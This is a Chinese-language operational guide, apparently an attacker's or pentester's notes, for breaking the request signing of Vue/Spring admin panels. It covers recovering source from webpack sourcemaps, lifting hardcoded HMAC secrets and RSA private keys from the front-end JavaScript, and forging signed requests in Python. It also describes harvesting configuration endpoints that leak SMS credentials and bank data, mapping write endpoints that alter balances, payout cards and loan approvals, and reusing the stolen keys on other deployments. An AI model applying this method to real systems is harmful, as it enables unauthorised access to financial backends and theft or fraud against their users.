# 签名式 API 复刻（HMAC + RSA 请求签名）

适用：自研管理端（Vue/ant-design SPA + Spring/Java 后端）对每个请求做自定义头签名。前端要能自己发请求，密钥与算法**必然内嵌在 JS 里** ⇒ 前端能跑，你就能伪造。拿到后台 = 改余额/改收款卡/放款审批的写接口全部在手。

## 1. 识别
- 首页只有 `<div id="app"></div>` + `/js/app.<hash>.js` + `/js/chunk-vendors.<hash>.js` ⇒ webpack Vue SPA，页面全在分包里。
- 自研 API 前缀（如 `/api/cat/v1/...`）。不带签名头 → `{"code":"x_api_key_invalid"}`。
- 这类站常配自研 WAF：未认证访问业务路径回 `{"path":"...","code":"unauthorized","message":"<vendor>:访问此资源需要完全的身份验证"}` —— WAF 层，不是应用层，别把它当家枚举结果。

## 2. 分包映射 + sourceMap（一次拿全源码）

webpack chunk URL 用的是**名字**不是数字 id：
```python
app = requests.get(B + "/js/app.82cb8108.js").text
i   = app.find('n.u=function(e){return"js/"+(')
seg = app[i:i+3000]
names  = dict(re.findall(r'(\d{1,4}):"([A-Za-z][A-Za-z0-9_]{1,30})"', seg))  # 42:"memberGrade"
hashes = dict(re.findall(r'(\d{1,4}):"([0-9a-f]{8})"',             seg))  # 42:"66012587"
# 真实 URL = f"{B}/js/{names[cid]}.{hashes[cid]}.js"  以及同名 .js.map
```
- **坑（整轮白跑）**：名字正则若写成 `([A-Za-z0-9_]+)`，十六进制哈希（纯 alnum）会被当成名字，配对全错 → 批量 404。名字必须以字母开头。
- 每个分包顺手拉 `.js.map`：`sourcesContent` = **原始源码全文**（Vue SFC），里面有接口与参数对象、`reactive()` 表单全字段、字段中文名、枚举、axios 实例与请求拦截器。
- 路由表 = 后台全部页面清单（`*/withdraw`、`*/recharge`、`*/loan`、`*/sms`、`*/bank` 这类财务/系统页价值最高）。

## 3. 签名算法复刻（实测典型形态）
```js
const rn="<X-Api-Key>", nn="<HMAC secret>", sn="1.0.0",
      on="-----BEGIN PRIVATE KEY-----
<REDACTED>
-----END PRIVATE KEY-----";
function an(t){const e=Date.now(), r=fn(t.data), n=un(), i=`${t.url}`;
  t.headers["X-Api-Version"]=sn; t.headers["X-Api-Key"]=rn; t.headers["X-Api-Timestamp"]=e;
  t.headers["X-Api-Nonce"]=n; t.headers["X-Api-Signature-Params"]=r.keys.join(",");
  t.headers["X-Api-Signature-Method"]="HmacSHA256";
  t.headers["X-Api-Signature"]=cn(r.urlParams,n,i);   // HMAC
  t.headers["X-Api-Digest"]=hn(r.urlParams);          // RSA
  if(localStorage.token) t.headers["Authorization"]=`Bearer ${localStorage.token}`;}
un = ()=> md5(rn + Date.now() + counter++);                       // nonce
cn = (up,nonce,url)=> encodeURIComponent(hex(HmacSHA256(nn, up+sn+nonce+url)));
hn = (up)=> encodeURIComponent(hextob64(MD5withRSA(on, up)));
fn = (data)=> ({keys: sortedKeys(data), urlParams: querystring.stringify(sortedData, {encode:false})});
```
Python 复刻：
- `urlParams` = 键名 **ASCII 升序**的 `k=v&k=v`，值**不做 URL 转义**；body 原样发送，`Content-Type: application/x-www-form-urlencoded`。
- RSA 摘要 = **PKCS#1 v1.5 + MD5** 签名再 base64 ⇒ 用 **pycryptodome**（`Crypto.Signature.pkcs1_15` + `Crypto.Hash.MD5`）。系统 python 的 `cryptography`/OpenSSL3 常拒绝 MD5 签名；本机固定用有 pycryptodome 的解释器（`/root/pentest-venv/bin/python3`）。
- **用错误回显自证算法是否正确（三步阶梯）**：
  1. 完全不带签名头 → `{"code":"x_api_key_invalid"}`；
  2. 头齐全但把 Content-Type 换成 `application/json` → `{"code":"system_error","msg":"digest_error"}` ⇒ 证明 Api-Key/HMAC/Digest 都被校验，且服务端**按 form 解析 body** 再算 urlParams；
  3. 头 + form 全对 → 进入业务逻辑（此时 400/500 才是参数问题）。
- 登录 token 可能是**全局静态**（同一账号反复登录返回同一个 token 且长期不变），别当成会话缓存或复用漏洞。

## 4. 参数与分页（最费时间的两个坑）
- **字段名必须从登录分包源码读，不许猜**：`setup(){ const t=(0,a.Kh)({username:"",password:""}); … (0,m.s)({tel:t.username,password:t.password}) }` ⇒ 真实字段是 **`tel`**（界面写「用户名/手机」）。猜 `username` 永远 `500 internal_server_error`。
- **ant-design + Spring Pageable 分页从 `page=0` 开始**。发 `page=1&size=50` 会回 `total=N` 但 `content: []` —— 看起来「没数据」，其实跳过了第一页。第一发永远 `page=0`。
- **`400 {"status":400,"error":"Bad Request","message":"","path":...}`（空 message）= 声明的强类型/布尔参数转换失败**，不是路径错也不是鉴权错。修法：从页面源码 `reactive({...})` 抄**完整筛选字段集**，空串 + 布尔 `false` 一起发：
```
{"type":"","username":"","tel":"","uid":"","terminal":"","ip":"","begin_date":"","end_date":"","dummy":"false","online":"","page":0,"size":20}
```
  只发 `page/size` 必然 400；漏一个布尔字段也 400。
- 需要主体对象的接口会直说字段名：`{"code":"request_parameters_error","msg":"assets.userId: must not be empty"}` / `password.oldPassword: must not be empty` ⇒ 直接读出参数名，不用爆破。
- 主键形态要读列表拿：有的表用**字符串业务主键**（`userId:"QOjzBLpW101646562"`），数字 uid 会回 `acc_not_exist`/400；用 `user/list` 里的 `userId` 回填。

## 5. 探索顺序（只读优先，写接口只登记）
1. 先打**无参 detail/statistic 类**：`data/statistic`、`*/statistic`、`bank/detail`、`rate/detail`、`sms/detail`、`csv2/detail`、`trade/control/detail` —— 这些常不校验业务域，直接吐配置：短信通道凭据、客服系统 URL、APP 下载地址、银行全表、VIP 规则、风控参数。
2. 再把**所有分包源码**里的 `/api/<prefix>/` 汇总成全接口地图（轻松上百条），标出写接口：`*/update`、`*/delete`、`*/approve`、`*/operate`、`edit_balance`、`user/bank/update`。
3. **写接口一律只登记不调用**（改余额/改卡/放款直接动受害者与真钱）。
4. 产物落盘：API 全图 + 配置快照 + 签名脚本（同一产品线的其它部署常共用同一套硬编码密钥 ⇒ 拿去逐台验证）。

## 6. 脚本工程坑
- **工作目录里不能有与标准库同名的脚本**（`enum.py`/`re.py`/`json.py` …）：脚本自身目录 = `sys.path[0]`，会遮蔽标准库，之后任何 python 都炸成 `AttributeError: partially initialized module 're' has no attribute 'compile'`。**换 cwd 运行无效**，必须改名：
```python
import os, shutil, sys
for f in os.listdir(D):
    if f.endswith(".py") and f[:-3] in sys.stdlib_module_names:
        shutil.move(f"{D}/{f}", f"{D}/sx_{f}")
```
- 签名脚本依赖 pycryptodome → 固定用 `/root/pentest-venv/bin/python3` 跑（系统 python3 只有 cryptography）。
